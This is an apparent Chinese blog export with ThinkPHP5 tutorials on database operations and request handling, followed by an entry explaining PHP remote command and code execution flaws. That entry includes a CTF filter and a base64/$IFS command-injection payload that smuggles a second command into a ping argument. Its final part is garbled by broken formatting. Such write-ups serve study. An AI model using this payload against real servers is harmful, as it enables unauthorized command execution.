<h2 id="二丶添加数据："><a href="#二丶添加数据：" class="headerlink" title="二丶添加数据："></a><font color = green >二丶添加数据：</font></h2><h2 id="添加多条数据："><a href="#添加多条数据：" class="headerlink" title="添加多条数据："></a><font color = green >添加多条数据：</font></h2><p>添加多条数据直接向Db类的insertAll方法传入需要添加的数据即可。<br><img src="https://i.imgur.com/AJwt1dE.png" alt="1">   </p>
<h2 id="三丶更新数据："><a href="#三丶更新数据：" class="headerlink" title="三丶更新数据："></a><font color = green >三丶更新数据：</font></h2><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setFileld(‘name’,’thinkphp’);<br>setFiled方法返回数据的条数，没修改任何数据字段返回0；</p>
<h2 id="四丶自增或自减一个字段的值："><a href="#四丶自增或自减一个字段的值：" class="headerlink" title="四丶自增或自减一个字段的值："></a><font color = green >四丶自增或自减一个字段的值：</font></h2><p>setInc/setDec如果不加第二个参数，默认值为1   </p>
<h3 id="score-字段加1"><a href="#score-字段加1" class="headerlink" title="score 字段加1"></a><font color=green>score 字段加1</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setInc(‘status’);   </p>
<h3 id="score-字段加5"><a href="#score-字段加5" class="headerlink" title="score 字段加5"></a><font color=green>score 字段加5</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setInc(‘status’,5); </p>
<h3 id="score-字段减5"><a href="#score-字段减5" class="headerlink" title="score 字段减5"></a><font color=green>score 字段减5</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setDec(‘status’,5);  </p>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>6.thinkphp5数据库查询之查询构造器1</title>
    <url>/undefined/6.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%9E%84%E9%80%A0%E5%99%A81/</url>
    <content><![CDATA[<h1 id="二丶数据库查询之查询构造器"><a href="#二丶数据库查询之查询构造器" class="headerlink" title="二丶数据库查询之查询构造器"></a><font color = red >二丶数据库查询之查询构造器</font></h1><h2 id="1丶table方法选择数据表"><a href="#1丶table方法选择数据表" class="headerlink" title="1丶table方法选择数据表"></a><font color=green>1丶table方法选择数据表</font></h2><p><img src="https://i.imgur.com/OdaxDKH.png" alt="1">   </p>
<h2 id="2丶name方法"><a href="#2丶name方法" class="headerlink" title="2丶name方法"></a><font color = green >2丶name方法</font></h2><p><font size=3>由于我们在数据可以配置文件中设置了数据表的前缀为think_，因此，<font color = red >table方法</font>可以改成<font color = red >name方法</font>这样就不会因为数据表前缀的修改而改动CURD代码，例如：</font><br><img src="https://i.imgur.com/1VER43B.png" alt="1">   </p>
<h2 id="3丶助手函数db"><a href="#3丶助手函数db" class="headerlink" title="3丶助手函数db"></a><font color = green >3丶助手函数db</font></h2><p>传入的表名也是不带前缀的，原表名为think_data;<br><img src="https://i.imgur.com/SpkCjkC.png" alt="1">   </p>
<h2 id="4丶链式操作"><a href="#4丶链式操作" class="headerlink" title="4丶链式操作"></a><font color = green >4丶链式操作</font></h2><p>使用链式操作可以完成复杂的数据库查询操作，例如：<br><img src="https://i.imgur.com/FPsjaCj.png" alt="1"><br>链式操作不分先后，只要在查询方法（这里是select方法）之前调用就行。所以，下面的查询是等效的；<br><img src="https://i.imgur.com/VmyKyL7.png" alt="1">  </p>
<h3 id="支持链式操作的查询方法包括："><a href="#支持链式操作的查询方法包括：" class="headerlink" title="支持链式操作的查询方法包括："></a><font color = green >支持链式操作的查询方法包括：</font></h3><p><img src="https://i.imgur.com/3oi4RLJ.png" alt="1">  </p>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>4.thinkphp5数据库操作之原生查询</title>
    <url>/undefined/4.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%8E%9F%E7%94%9F%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<h1 id="一丶数据库操作之原生查询"><a href="#一丶数据库操作之原生查询" class="headerlink" title="一丶数据库操作之原生查询"></a><font color=red>一丶数据库操作之原生查询</font></h1><h3 id="Db-类支持原生-SQL-查询操作，主要包括下面两个方法："><a href="#Db-类支持原生-SQL-查询操作，主要包括下面两个方法：" class="headerlink" title="Db 类支持原生 SQL 查询操作，主要包括下面两个方法："></a>Db 类支持原生 SQL 查询操作，主要包括下面两个方法：</h3><h4 id="1丶query-方法"><a href="#1丶query-方法" class="headerlink" title="1丶query 方法   "></a><font color=red>1丶query 方法   </font></h4><p>query 方法用于执行 SQL 查询操作，如果数据非法或者查询错误则返回false，否则返回查询结果数据集<br>（同 select 方法）。<br><font color=red>使用示例：</font><br>Db::query(“select * from think_user where status=1”);<br>如果你当前采用了分布式数据库，并且设置了读写分离的话，query方法始终是在读服务器执行，因此query方法对应的都是读操作，而不管你的SQL语句是什么。<br><font color=red>2丶execute 方法</font><br>execute用于更新和写入数据的sql操作，如果数据非法或者查询错误则返回false ，否则返回影响的记录数。<br><font color=red>使用示例：</font><br>Db::execute(“update think_user set name=’thinkphp’ where status=1”);<br>如果你当前采用了分布式数据库，并且设置了读写分离的话，execute方法始终是在写服务器执行，因此execute方法对应的都是写操作，而不管你的SQL语句是什么。 </p>
]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>3.thinkphp5数据库操作</title>
    <url>/undefined/3.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="配置文件定义"><a href="#配置文件定义" class="headerlink" title="配置文件定义"></a><font color=red>配置文件定义</font></h1><p>常用的配置方式是在应用目录或者模块目录下面的database.php中添加下面的参数：   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line"><span class="comment">// 数据库类型</span></span><br><span class="line"><span class="string">'type'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line"><span class="comment">// 数据库连接DSN配置</span></span><br><span class="line"><span class="string">'dsn'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 服务器地址</span></span><br><span class="line"><span class="string">'hostname'</span> =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line"><span class="comment">// 数据库名</span></span><br><span class="line"><span class="string">'database'</span> =&gt; <span class="string">'thinkphp'</span>,</span><br><span class="line"><span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="string">'username'</span> =&gt; <span class="string">'root'</span>,</span><br><span class="line"><span class="comment">// 数据库密码</span></span><br><span class="line"><span class="string">'password'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 数据库连接端口</span></span><br><span class="line"><span class="string">'hostport'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 数据库连接参数</span></span><br><span class="line"><span class="string">'params'</span> =&gt; [],</span><br><span class="line"><span class="comment">// 数据库编码默认采用utf8</span></span><br><span class="line"><span class="string">'charset'</span> =&gt; <span class="string">'utf8'</span>,</span><br><span class="line"><span class="comment">// 数据库表前缀</span></span><br><span class="line"><span class="string">'prefix'</span> =&gt; <span class="string">'think_'</span>,</span><br><span class="line"><span class="comment">// 数据库调试模式</span></span><br><span class="line"><span class="string">'debug'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span><br><span class="line"><span class="string">'deploy'</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="comment">// 数据库读写是否分离 主从式有效</span></span><br><span class="line"><span class="string">'rw_separate'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="comment">// 读写分离后 主服务器数量</span></span><br><span class="line"><span class="string">'master_num'</span> =&gt; <span class="number">1</span>,</span><br><span class="line"><span class="comment">// 指定从服务器序号</span></span><br><span class="line"><span class="string">'slave_no'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 是否严格检查字段是否存在</span></span><br><span class="line"><span class="string">'fields_strict'</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure></div>
<p>type 参数支持命名空间完整定义，不带命名空间定义的话，默认采用 \think\db\connector 作为命名<br>空间，如果使用应用自己扩展的数据库驱动，可以配置为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据库类型</span></span><br><span class="line"><span class="string">'type'</span> =&gt; <span class="string">'\org\db\Mysql'</span>,</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>2.thinkphp5请求</title>
    <url>/undefined/2.thinkphp5%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<h1 id="请求信息"><a href="#请求信息" class="headerlink" title="请求信息"></a><font color=red>请求信息</font></h1><h4 id="如果要获取当前的请求信息，可以使用-think-Request-类，"><a href="#如果要获取当前的请求信息，可以使用-think-Request-类，" class="headerlink" title="如果要获取当前的请求信息，可以使用 \think\Request 类，"></a>如果要获取当前的请求信息，可以使用 \think\Request 类，</h4><p>除了下文中的   </p>
<h3 id="request-Request-instance"><a href="#request-Request-instance" class="headerlink" title="$request = Request::instance();"></a>$request = Request::instance();</h3><p>也可以使用助手函数   </p>
<h3 id="request-request"><a href="#request-request" class="headerlink" title="$request = request();"></a>$request = request();</h3><h4 id="当然，最方便的还是使用注入请求对象的方式来获取变量。"><a href="#当然，最方便的还是使用注入请求对象的方式来获取变量。" class="headerlink" title="当然，最方便的还是使用注入请求对象的方式来获取变量。"></a>当然，最方便的还是使用注入请求对象的方式来获取变量。</h4><p>例如：   </p>
<h3 id="获取URL信息"><a href="#获取URL信息" class="headerlink" title="获取URL信息"></a>获取URL信息</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$request = Request::instance();</span><br><span class="line"><span class="comment">// 获取当前域名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'domain: '</span> . $request-&gt;domain() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取当前入口文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'file: '</span> . $request-&gt;baseFile() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取当前URL地址 不含域名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'url: '</span> . $request-&gt;url() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取包含域名的完整URL地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'url with domain: '</span> . $request-&gt;url(<span class="keyword">true</span>) . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取当前URL地址 不含QUERY_STRING</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'url without query: '</span> . $request-&gt;baseUrl() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL访问的ROOT地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'root:'</span> . $request-&gt;root() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL访问的ROOT地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'root with domain: '</span> . $request-&gt;root(<span class="keyword">true</span>) . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL地址中的PATH_INFO信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'pathinfo: '</span> . $request-&gt;pathinfo() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL地址中的PATH_INFO信息 不含后缀</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'pathinfo: '</span> . $request-&gt;path() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL地址中的后缀信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'ext: '</span> . $request-&gt;ext() . <span class="string">'&lt;br/&gt;'</span>;</span><br></pre></td></tr></table></figure></div>
<h4 id="输出结果为："><a href="#输出结果为：" class="headerlink" title="输出结果为：   "></a><font color = red>输出结果为：   </font></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">domain:</span> <span class="string">http:</span><span class="comment">//tp5.com</span></span><br><span class="line"><span class="string">file:</span> <span class="regexp">/index.php url: /</span>index<span class="regexp">/index/</span>hello.html?name=thinkphp</span><br><span class="line">url with domain: <span class="string">http:</span><span class="comment">//tp5.com/index/index/hello.html?name=thinkphp</span></span><br><span class="line">url without <span class="string">query:</span> <span class="regexp">/index/</span>index/hello.html</span><br><span class="line"><span class="string">root:</span></span><br><span class="line">root with <span class="string">domain:</span> <span class="string">http:</span><span class="comment">//tp5.com</span></span><br><span class="line"><span class="string">pathinfo:</span> index<span class="regexp">/index/</span>hello.html</span><br><span class="line"><span class="string">pathinfo:</span> index<span class="regexp">/index/</span>hello</span><br><span class="line"><span class="string">ext:</span> html</span><br></pre></td></tr></table></figure></div>
<h3 id="设置-获取-模块-控制器-操作名称"><a href="#设置-获取-模块-控制器-操作名称" class="headerlink" title="设置/获取 模块/控制器/操作名称"></a><font color=red>设置/获取 模块/控制器/操作名称</font></h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$request = Request::instance();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前模块名称是"</span> . $request-&gt;module();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前控制器名称是"</span> . $request-&gt;controller();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前操作名称是"</span> . $request-&gt;action();</span><br></pre></td></tr></table></figure></div>
<p>如果当前访问的地址是 <a href="http://serverName/index.php/index/hello_world/index" target="_blank" rel="noopener">http://serverName/index.php/index/hello_world/index</a><br>输出结果为：   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line">当前模块名称是<span class="keyword">index</span></span><br><span class="line">当前控制器名称是HelloWorld</span><br><span class="line">当前操作名称是<span class="keyword">index</span></span><br></pre></td></tr></table></figure></div>
<p>设置模块名称值需要向module方法中传入名称即可，同样使用于设置控制器名称和操作名称   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">Request::instance<span class="function"><span class="params">()</span>-&gt;</span><span class="built_in">module</span>(<span class="string">'module_name'</span>);</span><br></pre></td></tr></table></figure></div>
<h3 id="获取请求参数"><a href="#获取请求参数" class="headerlink" title="获取请求参数"></a><font color = red>获取请求参数</font></h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$request = Request::instance();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'请求方法：'</span> . $request-&gt;method() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'资源类型：'</span> . $request-&gt;type() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'访问ip地址：'</span> . $request-&gt;ip() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'是否AJax请求：'</span> . var_export($request-&gt;isAjax(), <span class="keyword">true</span>) . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'请求参数：'</span>;</span><br><span class="line">dump($request-&gt;param());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'请求参数：仅包含name'</span>;</span><br><span class="line">dump($request-&gt;only([<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'请求参数：排除name'</span>;</span><br><span class="line">dump($request-&gt;except([<span class="string">'name'</span>]));</span><br><span class="line">输出结果为：</span><br><span class="line">请求方法：GET</span><br><span class="line">资源类型：html</span><br><span class="line">访问ip地址：<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">是否Ajax请求：<span class="keyword">false</span></span><br><span class="line">请求参数：</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line"><span class="string">'test'</span> =&gt; string <span class="string">'ddd'</span> (length=<span class="number">3</span>)</span><br><span class="line"><span class="string">'name'</span> =&gt; string <span class="string">'thinkphp'</span> (length=<span class="number">8</span>)</span><br><span class="line">请求参数：仅包含name</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line"><span class="string">'name'</span> =&gt; string <span class="string">'thinkphp'</span> (length=<span class="number">8</span>)</span><br><span class="line">请求参数：排除name</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line"><span class="string">'test'</span> =&gt; string <span class="string">'ddd'</span> (length=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/undefined/RCE/</url>
    <content><![CDATA[<h1 id="RCE漏洞原理"><a href="#RCE漏洞原理" class="headerlink" title="RCE漏洞原理"></a>RCE漏洞原理</h1><p> <strong>英文全称：remote command/code execute(远程命令/代码执行漏洞)；</strong></p>
<h3 id="RCE分为远程命令执行和远程代码执行"><a href="#RCE分为远程命令执行和远程代码执行" class="headerlink" title="RCE分为远程命令执行和远程代码执行"></a>RCE分为<font color = red>远程命令执行</font>和<font color = red>远程代码执行</font></h3><p>区别：   </p>
<ul>
<li>能够对一个php的站点，控制php代码，那么我们就把它划分为代码执行      </li>
<li>如果能执行网站所在服务器中的命令，我们这就把它划分为命令执行，因为它执行的是系统命令</li>
</ul>
<h2 id="0x0-远程命令执行"><a href="#0x0-远程命令执行" class="headerlink" title="0x0 远程命令执行"></a>0x0 远程命令执行</h2><h4 id="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"><a href="#命令执行漏洞指的是可以执行系统或者应用指令的漏洞" class="headerlink" title="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"></a>命令执行漏洞指的是可以执行系统或者应用指令的漏洞</h4><p>如CMD命令或者bash命令的漏洞，PHP的命令执行漏洞主要基于一些函数的参数过滤不严导致，可以执行命令的函数有:<br><font color =red >system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open(),ob_start()，mail函数+LD_PRELOAD </font><br>执行系统命令共九个函数,另外反引号(`)也可以执行命令,不过实际上这种方式也是调用的shell_exec()函数。</p>
<h2 id="讲解函数"><a href="#讲解函数" class="headerlink" title="讲解函数"></a>讲解函数</h2><p>php提供了system(),exec(),passthru()这几个函数来调用外部的命令.    </p>
<p><font color = red>他们的区别 :</font>   </p>
<ul>
<li>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。  </li>
<li>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</li>
<li>passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。   </li>
</ul>
<p><font color = red>相同点:</font>  </p>
<ul>
<li>都可以获得命令执行的状态码  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">Linux下一条命令或一个进程执行完成会返回一个一个状态码。</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>   ===   成功执行</span><br><span class="line"></span><br><span class="line">非<span class="number">0</span> ===  执行过程中出现异常或非正常退出</span><br></pre></td></tr></table></figure></div>
在PHP中调用外部命令，可以用如下三种方法来实现：<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"system('whoami'):   "</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">system(<span class="string">'whoami'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"var_dump(exec('ipconfig')):   "</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">var_dump(exec(<span class="string">'ipconfig'</span>));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'exec(whoami,$b):'</span>;</span></span><br><span class="line"><span class="php">exec(<span class="string">'whoami'</span>,$b);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">var_dump($b);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"exec('whoami')"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">exec(<span class="string">'whoami'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"passthru('whoami'):"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">passthru(<span class="string">'whoami'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"shell_exec('ipconfig')"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div></li>
<li><em>popen()函数*</em><br>popen()、proc_open()函数不会直接返回执行结果，而是返回一个文件指针，但命令是已经执行了的，下面我们看看 popen()的用法,它需要两个参数,一个是执行的命令,另<br>外一个是指针文件的连接模式，有r 和 w代表读和写。<br>测试代码如下：</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">windows下</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">popen(<span class="string">'dir &gt;&gt;E:/2.txt'</span>,<span class="string">'w'</span>)</span></span><br><span class="line"><span class="php"><span class="comment">//把标准输出重定向到一个文件中(追加)</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">linux下：</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file = popen(<span class="string">"/bin/ls"</span>,<span class="string">"r"</span>);</span></span><br><span class="line"><span class="php"><span class="comment">//some code to be executed</span></span></span><br><span class="line"><span class="php">pclose($file);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<h2 id="CTF例题："><a href="#CTF例题：" class="headerlink" title="CTF例题："></a><font color = gree>CTF例题：</font></h2><ul>
<li><p>DVWA靶场命令执行题<br><a href="http://127.0.0.1:8000/DVWA/vulnerabilities/exec/" target="_blank" rel="noopener">http://127.0.0.1:8000/DVWA/vulnerabilities/exec/</a></p>
</li>
<li><p>附一道GXY的题，现在buu上的pingpingping</p>
</li>
<li><pre><code>$ip=|\&apos;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&apos;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
    die(&quot;fxck your symbol!&quot;);
  } else if(preg_match(&quot;/ /&quot;, $ip)){
    die(&quot;fxck your space!&quot;);
  } else if(preg_match(&quot;/bash/&quot;, $ip)){
    die(&quot;fxck your bash!&quot;);
  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
    die(&quot;fxck your flag!&quot;);
  }
  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
  echo &quot;
&quot;;
  print_r($a);}

?&gt;
//payload：127.0.0.1|ls;a=`echo$IFS$9ZmxhZy5waHA=|base64$IFS$9-d`;base64$IFS$9$a

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## &lt;<span class="built_in">font</span> <span class="built_in">color</span> = gree&gt;远程代码执行&lt;/<span class="built_in">font</span>&gt;</span><br><span class="line">代码执行漏洞是指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行.说得好理解一点类似于SQL注人漏洞,可以把SQL语句注入到SQL服务执行，而PHP代码执行漏洞则是可以把代码注入</span><br><span class="line">到应用中，最终到Webserver去执行。   </span><br><span class="line"></span><br><span class="line">这样的漏洞如果没有特殊的过滤，相当于直接有一个Web后门存在，该漏洞主要由&lt;<span class="built_in">font</span> <span class="built_in">color</span> = red&gt;<span class="built_in">eval</span>()、assert()、preg_replace()、call_user_func()call_user_func_array()、array_map()&lt;/<span class="built_in">font</span>&gt;等函数的参数过滤不严格导致     </span><br><span class="line"></span><br><span class="line">另外还有PHP的动态函数（$a($b))也是目前出现比较多的。</span><br><span class="line"></span><br><span class="line">## &lt;<span class="built_in">font</span> <span class="built_in">color</span> = gree&gt;讲解函数&lt;/<span class="built_in">font</span>&gt;</span><br><span class="line">### &lt;<span class="built_in">font</span> <span class="built_in">color</span> = red&gt;<span class="built_in">eval</span>()函数&lt;/<span class="built_in">font</span>&gt;   </span><br><span class="line"><span class="built_in">eval</span>() 函数把字符串按照 PHP 代码来计算。   </span><br><span class="line">该字符串必须是合法的 PHP 代码，且必须以分号结尾。    </span><br><span class="line">如果代码中存在解析错误，则 <span class="built_in">eval</span>() 函数返回 <span class="literal">false</span>。</span><br></pre></td></tr></table></figure></div>
&lt;?php
$a = &apos;aaa&apos;;
$b = &apos;bbb&apos;;
eval(&apos;$a=$b;&apos;);
var_dump($a);
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">~~~</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'echo 1111;'</span>);</span></span><br></pre></td></tr></table></figure></div>
代码不能包含打开/关闭PHP标签，但可以用合适的 PHP tag 来闭合离开、重新进入 PHP 模式。   
